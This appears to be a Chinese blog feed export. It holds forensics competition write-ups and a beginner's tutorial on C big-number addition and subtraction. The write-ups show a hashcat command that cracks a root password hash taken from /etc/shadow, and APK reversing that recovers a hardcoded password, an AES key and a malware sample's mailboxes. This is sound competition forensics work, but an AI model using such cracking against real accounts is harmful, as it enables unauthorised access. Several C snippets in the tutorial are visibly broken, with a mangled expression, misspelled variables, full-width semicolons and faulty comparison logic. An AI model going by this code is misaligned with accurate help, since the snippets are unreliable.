<p>可以看到pcid为5的为外汇,且我们要主要杯删除的商品<br><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/IMG_20241028-190132978.png" class="">  </p>
<img src="/2024/10/20/%E9%99%87%E4%BF%A12023/IMG_20241028-190059199.png" class="">  
<p>可以找到两个</p>
<h2 id="7-全部网站一共有-名受害人。（格式：xxx。不去重-不进行数据恢复）-1"><a href="#7-全部网站一共有-名受害人。（格式：xxx。不去重-不进行数据恢复）-1" class="headerlink" title="7.全部网站一共有_名受害人。（格式：xxx。不去重,不进行数据恢复）"></a>7.全部网站一共有<strong><em>_</em></strong>名受害人。（格式：xxx。不去重,不进行数据恢复）</h2><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/IMG_20241028-190655306.png" class="">  
<h2 id="8-分发网站tf-chongwuxiaoyouxi-com里面一共有-位“组员级别”的管理员。（格式：数字）-1"><a href="#8-分发网站tf-chongwuxiaoyouxi-com里面一共有-位“组员级别”的管理员。（格式：数字）-1" class="headerlink" title="8.分发网站tf.chongwuxiaoyouxi.com里面一共有_位“组员级别”的管理员。（格式：数字）"></a>8.分发网站tf.chongwuxiaoyouxi.com里面一共有<strong><em>_</em></strong>位“组员级别”的管理员。（格式：数字）</h2><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/IMG_20241028-191429074.png" class="">  
<p>在字段名中存在备注.<br><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/IMG_20241028-191409561.png" class=""><br>我们需要查看变化金额即account大于582402的和title为充值.<br><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/IMG_20241028-191326955.png" class=""><br>再使用SUM函数求和</p>
<h2 id="9-分发网站sb-wiiudot-cn管理员名为“0820”的邀请码是-。（格式：xxx）-1"><a href="#9-分发网站sb-wiiudot-cn管理员名为“0820”的邀请码是-。（格式：xxx）-1" class="headerlink" title="9.分发网站sb.wiiudot.cn管理员名为“0820”的邀请码是_。（格式：xxx）"></a>9.分发网站sb.wiiudot.cn管理员名为“0820”的邀请码是<strong><em>_</em></strong>。（格式：xxx）</h2><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/IMG_20241028-192007943.png" class="">  
<p>但不是张教瘦<br><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/IMG_20241028-192413090.png" class=""><br>通过uid可以再userinfo里找到叫kongxin</p>
<h2 id="10-请分析“乐享金融”建仓时间为“2022-03-01-18-44-01”，平仓时间为“2022-03-01-18-52-01”，以太坊-泰达币的这一笔交易的平仓价格是-。（标准格式：1888-668）"><a href="#10-请分析“乐享金融”建仓时间为“2022-03-01-18-44-01”，平仓时间为“2022-03-01-18-52-01”，以太坊-泰达币的这一笔交易的平仓价格是-。（标准格式：1888-668）" class="headerlink" title="10.请分析“乐享金融”建仓时间为“2022/03/01 18:44:01”，平仓时间为“2022/03/01 18:52:01”，以太坊/泰达币的这一笔交易的平仓价格是_。（标准格式：1888.668）"></a>10.请分析“乐享金融”建仓时间为“2022/03/01 18:44:01”，平仓时间为“2022/03/01 18:52:01”，以太坊/泰达币的这一笔交易的平仓价格是<strong><em>_</em></strong>。（标准格式：1888.668）</h2><p>数据库查着查着get到一个小骚招，我们可以先使用如下语句来导出数据库的所有注释<br><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> TABLE_NAME, COLUMN_NAME, COLUMN_COMMENT </span><br><span class="line"><span class="keyword">FROM</span> information_schema.COLUMNS </span><br><span class="line"><span class="keyword">WHERE</span> TABLE_SCHEMA <span class="operator">=</span> <span class="string">&#x27;sjp&#x27;</span> </span><br></pre></td></tr></table></figure><br>然后就可以利用题目的关键性进行快速定位，当然了如果没定位到也就要自己慢慢找了<br>也可以直接再全局搜，这样效率会比一个个找块很多<br><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/IMG_20241028-193714783.png" class="">  </p>
<img src="/2024/10/20/%E9%99%87%E4%BF%A12023/IMG_20241028-193642577.png" class="">  
<p>当然这只是定位很多地方还是得需要sql语句的<br><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/IMG_20241028-194439738.png" class=""><br>我们可以发现其建仓和平仓的时间为时间戳。转换运行使用sql语句查询<br><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/IMG_20241028-194419333.png" class="">  </p>
<p>2896.924</p>
<h2 id="11-请分析“乐享金融”订单编号为“202112090946233262”平仓时间是-。（标准格式：2022-1-11-1-22-43）"><a href="#11-请分析“乐享金融”订单编号为“202112090946233262”平仓时间是-。（标准格式：2022-1-11-1-22-43）" class="headerlink" title="11.请分析“乐享金融”订单编号为“202112090946233262”平仓时间是_。（标准格式：2022-1-11.1:22:43）"></a>11.请分析“乐享金融”订单编号为“202112090946233262”平仓时间是<strong><em>_</em></strong>。（标准格式：2022-1-11.1:22:43）</h2><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/IMG_20241028-195120195.png" class="">  
<p>一查好家伙啥也查不到。<br><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/IMG_20241028-195044849.png" class=""><br>我们可以看到宝塔有备份，我们把宝塔备份导入试试<br><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/IMG_20241028-195237969.png" class=""><br>导入后就可以查到了<br><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/IMG_20241028-195318521.png" class=""><br>2021-12-09 09:52:23</p>
<h2 id="12-宝塔面板某用户曾尝试进行一次POST请求，参数为“-BTCloud-action-UploadFilesData”，请问该用户疑似使用的（-）电脑系统进行访问请求的。"><a href="#12-宝塔面板某用户曾尝试进行一次POST请求，参数为“-BTCloud-action-UploadFilesData”，请问该用户疑似使用的（-）电脑系统进行访问请求的。" class="headerlink" title="12.宝塔面板某用户曾尝试进行一次POST请求，参数为“/BTCloud?action=UploadFilesData”，请问该用户疑似使用的（ ）电脑系统进行访问请求的。"></a>12.宝塔面板某用户曾尝试进行一次POST请求，参数为“/BTCloud?action=UploadFilesData”，请问该用户疑似使用的（ ）电脑系统进行访问请求的。</h2><p>宝塔的日志再/www/server/panel/logs/文件夹下<br>再火眼里只有几个文件，所以我直接再仿真的服务器里将文件导出<br><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/IMG_20241028-200713651.png" class=""><br>然后压缩到同一个文件夹下进行搜索<br><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/IMG_20241028-200744136.png" class=""><br>其UA头的版本为NT 6.3<br><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/IMG_20241028-200631298.png" class="">  </p>
<h2 id="13-请分析该服务器镜像最高权限“root”账户的密码是-。（标准格式：a123456）"><a href="#13-请分析该服务器镜像最高权限“root”账户的密码是-。（标准格式：a123456）" class="headerlink" title="13.请分析该服务器镜像最高权限“root”账户的密码是_。（标准格式：a123456）"></a>13.请分析该服务器镜像最高权限“root”账户的密码是<strong><em>_</em></strong>。（标准格式：a123456）</h2><p>在火眼中查看etc/shadow<br>然后使用hashcat来爆破<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hashcat  -a 0 &#x27;$1$kmYU/aog$fKIF3ugewwCTuPWOSksjD/&#x27; /usr/share/wordlists/rockyou.txt --force --self-test-disable </span><br></pre></td></tr></table></figure><br>一般liunx下的加密方法为<code>sha512crypt $6$, SHA512 (Unix)</code>即 -m 1800。而win一般为 1000。当然这题就是普通的md5</p>
]]></content>
  </entry>
  <entry>
    <title>高精度算法</title>
    <url>/2023/10/29/%E9%AB%98%E7%B2%BE%E5%BA%A6%E7%AE%97%E6%B3%95/</url>
    <content><![CDATA[<h1 id="关与高精度算法的学习"><a href="#关与高精度算法的学习" class="headerlink" title="关与高精度算法的学习"></a>关与高精度算法的学习</h1><h2 id="这篇博文会记载我学习c语言高精度算法的过程，我会将我学习的内容输出的这篇博文之下。"><a href="#这篇博文会记载我学习c语言高精度算法的过程，我会将我学习的内容输出的这篇博文之下。" class="headerlink" title="这篇博文会记载我学习c语言高精度算法的过程，我会将我学习的内容输出的这篇博文之下。"></a>这篇博文会记载我学习c语言高精度算法的过程，我会将我学习的内容输出的这篇博文之下。</h2><p> 高精度顾名思义就是将长到longlong都无法储存的数字存储到数组内进行四则运算。<br> 原理其实和小学学的竖式可以说一模一样。每一位相加大于10进1。实现这个的代码如下<br> <figure class="highlight c"><table><tr><td class="code"><pre><span class="line">arr3[i]=arr[i]arr1[i]+arr2[i];</span><br><span class="line">arr3[i+<span class="number">1</span>]=arr3[i]/<span class="number">10</span>;</span><br><span class="line">arr3[i]=arr3[i]%<span class="number">10</span>;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></p>
<p>当然我们都知道字符型数组里的元素是无法进行四则运算的所以我们需要将字符串转换为整形数组主要操作如下（<strong>由于在循环时我们习惯将i从小到大进行++所以我们在将字符串存储在整形数组里时需要以下代码的操作就是将字符串反向存储到整形数组中</strong>）<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> i=<span class="number">0</span>；</span><br><span class="line"><span class="comment">//arr1和arr2为字符串数组 </span></span><br><span class="line"><span class="comment">//arr3和arr4为整形数组</span></span><br><span class="line">s1=<span class="built_in">strlen</span>(arr1);</span><br><span class="line">s2=<span class="built_in">strlen</span>(arr2);</span><br><span class="line"><span class="keyword">for</span>(;i&lt;s1;i++)</span><br><span class="line">&#123;</span><br><span class="line">arr3[s1-i]=arr1[i]-<span class="string">&#x27;0&#x27;</span>;<span class="comment">//将字符串的数字反向存储到整形数组中,使arr3[1]是个位上的数</span></span><br><span class="line">&#125;</span><br><span class="line">i=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(;i&lt;s2;i++)</span><br><span class="line">&#123;</span><br><span class="line">    arr4[s2-i]=arr2[i]-<span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>那么我们利用以上两个程序就可以写出高精度加法了（<strong>代码如下</strong>）<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">char</span> arr1[<span class="number">1000</span>] = &#123;<span class="string">&quot;0&quot;</span>&#125;;</span><br><span class="line"><span class="type">char</span> arr2[<span class="number">1000</span>] = &#123;<span class="string">&quot;0&quot;</span>&#125;;</span><br><span class="line"><span class="type">int</span> arr3[<span class="number">1000</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="type">int</span> arr4[<span class="number">1000</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%s%s&quot;</span>, arr1, arr2);</span><br><span class="line"><span class="type">int</span> s1 = <span class="built_in">strlen</span>(arr1);</span><br><span class="line"><span class="type">int</span> s2 = <span class="built_in">strlen</span>(arr2);</span><br><span class="line"><span class="comment">//将字符串转换</span></span><br><span class="line"><span class="type">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (;i &lt; s1;i++)</span><br><span class="line">&#123;</span><br><span class="line">arr3[s1-i]=arr1[i]-<span class="string">&#x27;0&#x27;</span>;</span><br><span class="line"> &#125;</span><br><span class="line"><span class="keyword">for</span> (;j &lt; s2;j++)</span><br><span class="line">&#123;</span><br><span class="line">arr4[s2-j] = arr2[j]-<span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> max = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (s1 &gt;= s2)</span><br><span class="line">max = s1;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">max = s2;</span><br><span class="line"><span class="type">int</span> add[<span class="number">1000</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">1</span>;i &lt;= max;i++)</span><br><span class="line">&#123;</span><br><span class="line">add[i] = add[i] + arr3[i] + arr4[i];</span><br><span class="line">add[i + <span class="number">1</span>] = add[i] / <span class="number">10</span>;</span><br><span class="line">add[i] = add[i] % <span class="number">10</span>;</span><br><span class="line">&#125;</span><br><span class="line">i = max;</span><br><span class="line"><span class="keyword">for</span> (;i&gt;<span class="number">0</span>;i--)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, add[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>以上代码就是高精度加法了</p>
<h2 id="加法之后自然就是减法了"><a href="#加法之后自然就是减法了" class="headerlink" title="加法之后自然就是减法了"></a>加法之后自然就是<strong>减法</strong>了</h2><h4 id="相信各位都有攻读过小学学历吧，那么攻读过小学学位的各位应该知道，在小学是没有负数的，所有我们需要先比两个数组的大小后对数组进行交换"><a href="#相信各位都有攻读过小学学历吧，那么攻读过小学学位的各位应该知道，在小学是没有负数的，所有我们需要先比两个数组的大小后对数组进行交换" class="headerlink" title="相信各位都有攻读过小学学历吧，那么攻读过小学学位的各位应该知道，在小学是没有负数的，所有我们需要先比两个数组的大小后对数组进行交换"></a>相信各位都有攻读过小学学历吧，那么攻读过小学学位的各位应该知道，在小学是没有负数的，所有我们需要先比两个数组的大小后对数组进行交换</h4><p>代码如下：<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> t = <span class="number">0</span>;</span><br><span class="line"><span class="type">char</span> arr1[<span class="number">10000</span>] = &#123; <span class="string">&quot;0&quot;</span> &#125;;</span><br><span class="line"><span class="type">char</span> arr2[<span class="number">10000</span>] = &#123; <span class="string">&quot;0&quot;</span> &#125;;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%s%s&quot;</span>, &amp;arr1, &amp;arr2);</span><br><span class="line"><span class="type">int</span> s1 = <span class="built_in">strlen</span>(arr1);</span><br><span class="line"><span class="type">int</span> s2 = <span class="built_in">strlen</span>(arr2);</span><br><span class="line"><span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (arr1[<span class="number">0</span>]&lt;arr2[<span class="number">0</span>] &amp;&amp; s1 == s2 || s2&gt;s1)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (;i &lt; s2;i++)</span><br><span class="line">&#123;</span><br><span class="line">t = arr2[i];</span><br><span class="line">arr2[i] = arr1[i];</span><br><span class="line">arr1[i] = t;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>而后与加法相同先将字符串转换为整形数组。代码如下<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> i=<span class="number">0</span>；</span><br><span class="line"><span class="comment">//arr1和arr2为字符串数组 </span></span><br><span class="line"><span class="comment">//arr3和arr4为整形数组</span></span><br><span class="line">s1=<span class="built_in">strlen</span>(arr1);</span><br><span class="line">s2=<span class="built_in">strlen</span>(arr2);</span><br><span class="line"><span class="keyword">for</span>(;i&lt;s1;i++)</span><br><span class="line">&#123;</span><br><span class="line">arr3[s1-i]=arr1[i]-<span class="string">&#x27;0&#x27;</span>;<span class="comment">//将字符串的数字反向存储到整形数组中,使arr3[1]是个位上的数</span></span><br><span class="line">&#125;</span><br><span class="line">i=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(;i&lt;s2;i++)</span><br><span class="line">&#123;</span><br><span class="line">    arr4[s2-i]=arr2[i]-<span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>之后就是经典的小学运算了。运算方式如下<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//设arr1与arr2为已经转换为整型数组的数组</span></span><br><span class="line"><span class="keyword">if</span>(arr1[i]&lt;aarr2[i])</span><br><span class="line">&#123;</span><br><span class="line">    arr1[i+<span class="number">1</span>]--;</span><br><span class="line">    arr[i]+=<span class="number">10</span>;</span><br><span class="line">&#125;</span><br><span class="line">arr3[i]=arr3[i]+arr1[i]-arr2[i];</span><br><span class="line">arr3[i+<span class="number">1</span>]=arr3[i]/<span class="number">10</span>;</span><br><span class="line">arr3[i]=arr[i]%<span class="number">10</span>；</span><br></pre></td></tr></table></figure><br>将以上代码结合起来就是高精度减法的全部了。<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></p>
]]></content>
      <categories>
        <category>c语言</category>
      </categories>
      <tags>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>龙信杯2024</title>
    <url>/2024/10/30/%E9%BE%99%E4%BF%A1%E6%9D%AF2024/</url>
    <content><![CDATA[<img src="/2024/10/30/%E9%BE%99%E4%BF%A1%E6%9D%AF2024/IMG_20241030-121123063.png" class="">  
<h1 id="手机取证"><a href="#手机取证" class="headerlink" title="手机取证"></a>手机取证</h1><h2 id="1-分析手机检材，请问此手机共通过adb连接过几个设备？-标准格式：3"><a href="#1-分析手机检材，请问此手机共通过adb连接过几个设备？-标准格式：3" class="headerlink" title="1.分析手机检材，请问此手机共通过adb连接过几个设备？(标准格式：3)"></a>1.分析手机检材，请问此手机共通过adb连接过几个设备？(标准格式：3)</h2><img src="/2024/10/30/%E9%BE%99%E4%BF%A1%E6%9D%AF2024/IMG_20241030-123526832.png" class="">  
<p>我们宿舍adb可以搜索道adb_keys其文件中有两个key,当使用adb链接其他设备时会生成一个公私钥,公钥存在adb_keys中.所以连接过两个 xml中还有时间戳</p>
<h2 id="2-分析手机检材，机主参加考试的时间是什么时候？-标准格式：2024-06-17"><a href="#2-分析手机检材，机主参加考试的时间是什么时候？-标准格式：2024-06-17" class="headerlink" title="2.分析手机检材，机主参加考试的时间是什么时候？(标准格式：2024-06-17)"></a>2.分析手机检材，机主参加考试的时间是什么时候？(标准格式：2024-06-17)</h2><img src="/2024/10/30/%E9%BE%99%E4%BF%A1%E6%9D%AF2024/IMG_20241030-130022799.png" class="">  
<p>我们可以看到这个修改时间为8月12日,下周5也就是8月23<br><img src="/2024/10/30/%E9%BE%99%E4%BF%A1%E6%9D%AF2024/IMG_20241030-130051670.png" class="">  </p>
<h2 id="3-分析手机检材，请问手机的蓝牙Mac地址是多少？-标准格式：12-12-12-12-12-12"><a href="#3-分析手机检材，请问手机的蓝牙Mac地址是多少？-标准格式：12-12-12-12-12-12" class="headerlink" title="3.分析手机检材，请问手机的蓝牙Mac地址是多少？(标准格式：12:12:12:12:12:12)"></a>3.分析手机检材，请问手机的蓝牙Mac地址是多少？(标准格式：12:12:12:12:12:12)</h2><img src="/2024/10/30/%E9%BE%99%E4%BF%A1%E6%9D%AF2024/IMG_20241030-164117417.png" class="">  
<h2 id="4-分析手机检材，请问压缩包加密软件共加密过几份文件？-标准格式：3"><a href="#4-分析手机检材，请问压缩包加密软件共加密过几份文件？-标准格式：3" class="headerlink" title="4.分析手机检材，请问压缩包加密软件共加密过几份文件？(标准格式：3)"></a>4.分析手机检材，请问压缩包加密软件共加密过几份文件？(标准格式：3)</h2><img src="/2024/10/30/%E9%BE%99%E4%BF%A1%E6%9D%AF2024/IMG_20241030-171735282.png" class="">  
<p>我们在应用列表里搜索关键词，如file,zip,rar,7z,Encryptor,Crypto等，如果搜不到就只能一个个看了，我们搜索file可以找到一个为FileCompress，文件压缩的软件。</p>
<img src="/2024/10/30/%E9%BE%99%E4%BF%A1%E6%9D%AF2024/IMG_20241030-173953023.png" class="">  
<p>我们搜索最后一个文件夹的名字来查找该应用的安装位置。会发现一个apk猜测为该软件的apk。<br><img src="/2024/10/30/%E9%BE%99%E4%BF%A1%E6%9D%AF2024/IMG_20241030-172551055.png" class="">  </p>
<p>在安卓应用的数据一般存储在/storage/emulated/0 或 media/0文件夹下，我们在这些文件夹下搜索可以找到如下的文件。点开这些exe发现需要<br>打开txt可以发现为压缩包，改为zip发现需要密码。</p>
<img src="/2024/10/30/%E9%BE%99%E4%BF%A1%E6%9D%AF2024/IMG_20241030-173226800.png" class="">  
<p>我们将apk由模拟器打开发现其并没有告知密码也没有设置密码的环节，那么密码应该就在apk中了</p>
<img src="/2024/10/30/%E9%BE%99%E4%BF%A1%E6%9D%AF2024/IMG_20241030-173138311.png" class="">  
<p>逆向apk，在apk的包名的包下可以找到密码。（apk逆向后先看apk自己的包）<br><img src="/2024/10/30/%E9%BE%99%E4%BF%A1%E6%9D%AF2024/IMG_20241030-174410016.png" class=""><br>1!8Da9Re5it2b3a.</p>
<p>总共加密过6份文件</p>
<h2 id="5-分析手机检材，请问机主的另外一个155的手机号码是多少？-标准格式：15555000555"><a href="#5-分析手机检材，请问机主的另外一个155的手机号码是多少？-标准格式：15555000555" class="headerlink" title="5.分析手机检材，请问机主的另外一个155的手机号码是多少？(标准格式：15555000555)"></a>5.分析手机检材，请问机主的另外一个155的手机号码是多少？(标准格式：15555000555)</h2><img src="/2024/10/30/%E9%BE%99%E4%BF%A1%E6%9D%AF2024/IMG_20241030-175351036.png" class="">  
<h2 id="6-分析手机检材，其手机存在一个加密容器，请问其容器密码是多少。（标准格式：abc123）"><a href="#6-分析手机检材，其手机存在一个加密容器，请问其容器密码是多少。（标准格式：abc123）" class="headerlink" title="6.分析手机检材，其手机存在一个加密容器，请问其容器密码是多少。（标准格式：abc123）"></a>6.分析手机检材，其手机存在一个加密容器，请问其容器密码是多少。（标准格式：abc123）</h2><p>在前面的压缩包中可以找到<br><img src="/2024/10/30/%E9%BE%99%E4%BF%A1%E6%9D%AF2024/IMG_20241030-174818262.png" class="">  </p>
<h2 id="7-分析手机检材，接上问，其容器中存在一份成员名单，嫌疑人曾经误触导致表格中的一个成员姓名被错误修改，请确认这个成员的原始正确姓名？-标准格式：张三"><a href="#7-分析手机检材，接上问，其容器中存在一份成员名单，嫌疑人曾经误触导致表格中的一个成员姓名被错误修改，请确认这个成员的原始正确姓名？-标准格式：张三" class="headerlink" title="7.分析手机检材，接上问，其容器中存在一份成员名单，嫌疑人曾经误触导致表格中的一个成员姓名被错误修改，请确认这个成员的原始正确姓名？(标准格式：张三)"></a>7.分析手机检材，接上问，其容器中存在一份成员名单，嫌疑人曾经误触导致表格中的一个成员姓名被错误修改，请确认这个成员的原始正确姓名？(标准格式：张三)</h2><img src="/2024/10/30/%E9%BE%99%E4%BF%A1%E6%9D%AF2024/IMG_20241030-184700713.png" class="">  
<p>在Download下可以找到data容器，然后使用TrueCrypt来挂载，不是说VeraCrypt完美兼容TrueCrypt容器吗，蚌。容器里有一张图片和一个表格</p>
<p>观察表格可以发现每个成员都是由邀请人推荐的，而邀请人都是这个团伙的成员，那么我们可以查看哪个邀请人没有出现在成员里，如果没有出现就代表这个成员被误修改了</p>
<h2 id="8-分析手机检材，接上题，请确认该成员的对应的最高代理人是谁（不考虑总部）？-标准格式：张三"><a href="#8-分析手机检材，接上题，请确认该成员的对应的最高代理人是谁（不考虑总部）？-标准格式：张三" class="headerlink" title="8.分析手机检材，接上题，请确认该成员的对应的最高代理人是谁（不考虑总部）？(标准格式：张三)"></a>8.分析手机检材，接上题，请确认该成员的对应的最高代理人是谁（不考虑总部）？(标准格式：张三)</h2><h2 id="9-分析手机检材，请确认在该组织中，最高层级的层次是多少？（从总部开始算第一级）-标准格式：10"><a href="#9-分析手机检材，请确认在该组织中，最高层级的层次是多少？（从总部开始算第一级）-标准格式：10" class="headerlink" title="9.分析手机检材，请确认在该组织中，最高层级的层次是多少？（从总部开始算第一级）(标准格式：10)"></a>9.分析手机检材，请确认在该组织中，最高层级的层次是多少？（从总部开始算第一级）(标准格式：10)</h2><h2 id="10-分析手机检材，请问第二层级（从总部开始算第一级）人员最多的人是多少人？-标准格式：100"><a href="#10-分析手机检材，请问第二层级（从总部开始算第一级）人员最多的人是多少人？-标准格式：100" class="headerlink" title="10.分析手机检材，请问第二层级（从总部开始算第一级）人员最多的人是多少人？(标准格式：100)"></a>10.分析手机检材，请问第二层级（从总部开始算第一级）人员最多的人是多少人？(标准格式：100)</h2><h2 id="11-分析手机检材，机主共开启了几款APP应用分身？-标准格式：3"><a href="#11-分析手机检材，机主共开启了几款APP应用分身？-标准格式：3" class="headerlink" title="11.分析手机检材，机主共开启了几款APP应用分身？(标准格式：3)"></a>11.分析手机检材，机主共开启了几款APP应用分身？(标准格式：3)</h2><h2 id="12-分析手机检材，请问机主现在安装了几款即时通讯软件（微博除外）？-标准格式：1"><a href="#12-分析手机检材，请问机主现在安装了几款即时通讯软件（微博除外）？-标准格式：1" class="headerlink" title="12.分析手机检材，请问机主现在安装了几款即时通讯软件（微博除外）？(标准格式：1)"></a>12.分析手机检材，请问机主现在安装了几款即时通讯软件（微博除外）？(标准格式：1)</h2><img src="/2024/10/30/%E9%BE%99%E4%BF%A1%E6%9D%AF2024/IMG_20241030-202323686.png" class="">  
<p>题目说的是即时通讯软件.所以应该不包括抖音这种。</p>
<h2 id="13-分析手机检材，请问勒索机主的账号是多少（非微信ID）？-标准格式：AB123CD45"><a href="#13-分析手机检材，请问勒索机主的账号是多少（非微信ID）？-标准格式：AB123CD45" class="headerlink" title="13.分析手机检材，请问勒索机主的账号是多少（非微信ID）？(标准格式：AB123CD45)"></a>13.分析手机检材，请问勒索机主的账号是多少（非微信ID）？(标准格式：AB123CD45)</h2><img src="/2024/10/30/%E9%BE%99%E4%BF%A1%E6%9D%AF2024/IMG_20241030-202917851.png" class="">  
<h2 id="14-分析手机检材，接上问，请问机主通过此应用共删除了多少条聊天记录-？-标准格式：2"><a href="#14-分析手机检材，接上问，请问机主通过此应用共删除了多少条聊天记录-？-标准格式：2" class="headerlink" title="14.分析手机检材，接上问，请问机主通过此应用共删除了多少条聊天记录 ？(标准格式：2)"></a>14.分析手机检材，接上问，请问机主通过此应用共删除了多少条聊天记录 ？(标准格式：2)</h2><img src="/2024/10/30/%E9%BE%99%E4%BF%A1%E6%9D%AF2024/IMG_20241030-203028996.png" class="">  
<p>1条</p>
<h2 id="15-分析手机检材，请问会盗取手机信息的APP应用包名是什么？-标准格式：com-lx-tt"><a href="#15-分析手机检材，请问会盗取手机信息的APP应用包名是什么？-标准格式：com-lx-tt" class="headerlink" title="15.分析手机检材，请问会盗取手机信息的APP应用包名是什么？(标准格式：com.lx.tt)"></a>15.分析手机检材，请问会盗取手机信息的APP应用包名是什么？(标准格式：com.lx.tt)</h2><img src="/2024/10/30/%E9%BE%99%E4%BF%A1%E6%9D%AF2024/IMG_20241030-203229685.png" class="">  
<img src="/2024/10/30/%E9%BE%99%E4%BF%A1%E6%9D%AF2024/IMG_20241030-203343975.png" class="">  
<h2 id="16-接上题，请问该软件作者预留的座机号码是多少？-标准格式：40088855555"><a href="#16-接上题，请问该软件作者预留的座机号码是多少？-标准格式：40088855555" class="headerlink" title="16.接上题，请问该软件作者预留的座机号码是多少？(标准格式：40088855555)"></a>16.接上题，请问该软件作者预留的座机号码是多少？(标准格式：40088855555)</h2><img src="/2024/10/30/%E9%BE%99%E4%BF%A1%E6%9D%AF2024/IMG_20241030-203658460.png" class="">  
<p>雷电apk快取发现了应该邮箱，但这个并不是座机好码，我们看一下源码<br><img src="/2024/10/30/%E9%BE%99%E4%BF%A1%E6%9D%AF2024/IMG_20241030-204825021.png" class=""><br>搜索s0这种看上去被加密的字符，会发现其都经过一个包下的方法处理，即b.b.a下的a类的a方法<br><img src="/2024/10/30/%E9%BE%99%E4%BF%A1%E6%9D%AF2024/IMG_20241030-205416140.png" class=""><br>根据源码可以发现其密钥为传入第二个参数即E10ADC3949BA59ABBE56E057F20F883E,而iv是密钥的前16位即E10ADC3949BA59AB<br><img src="/2024/10/30/%E9%BE%99%E4%BF%A1%E6%9D%AF2024/IMG_20241030-210832952.png" class=""><br>我们可以看到w0和x0是拼接后进行解密的<br><img src="/2024/10/30/%E9%BE%99%E4%BF%A1%E6%9D%AF2024/IMG_20241030-210937081.png" class=""><br>40085222666</p>
<h2 id="17-接上题，恶意程序偷取数据的收件邮箱地址的gmail邮箱是多少？-标准格式：lx-gmail-com"><a href="#17-接上题，恶意程序偷取数据的收件邮箱地址的gmail邮箱是多少？-标准格式：lx-gmail-com" class="headerlink" title="17.接上题，恶意程序偷取数据的收件邮箱地址的gmail邮箱是多少？(标准格式：lx@gmail.com)"></a>17.接上题，恶意程序偷取数据的收件邮箱地址的gmail邮箱是多少？(标准格式：lx@gmail.com)</h2><img src="/2024/10/30/%E9%BE%99%E4%BF%A1%E6%9D%AF2024/IMG_20241030-210601082.png" class="">  
<h2 id="18-接上题，恶意程序偷取数据的发件邮箱地址是多少？-标准格式：lx-gmail-com"><a href="#18-接上题，恶意程序偷取数据的发件邮箱地址是多少？-标准格式：lx-gmail-com" class="headerlink" title="18.接上题，恶意程序偷取数据的发件邮箱地址是多少？(标准格式：lx@gmail.com)"></a>18.接上题，恶意程序偷取数据的发件邮箱地址是多少？(标准格式：lx@gmail.com)</h2><img src="/2024/10/30/%E9%BE%99%E4%BF%A1%E6%9D%AF2024/IMG_20241030-212348015.png" class="">  
<p>可以看到b()是一个发送邮件的方法,最终会将谷歌的邮箱和发送的内容传到aVar.a()里我们步入<br><img src="/2024/10/30/%E9%BE%99%E4%BF%A1%E6%9D%AF2024/IMG_20241030-212717062.png" class=""><br>可以发现一开始进行了一个解密操作<br><img src="/2024/10/30/%E9%BE%99%E4%BF%A1%E6%9D%AF2024/IMG_20241030-212703014.png" class=""><br>可以发现邮箱</p>
